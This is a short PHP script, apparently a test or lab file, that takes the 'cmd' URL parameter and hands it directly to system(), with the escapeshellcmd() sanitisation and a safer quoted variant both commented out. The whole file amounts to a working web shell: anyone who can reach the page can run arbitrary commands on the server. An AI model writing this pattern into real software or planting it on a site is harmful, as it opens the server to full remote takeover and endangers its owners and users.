<?php 
$test = $_GET['cmd']; 
// $test = escapeshellcmd($test);
var_dump($test);
// system("ls -al '$test'"); 
system($test); 
?>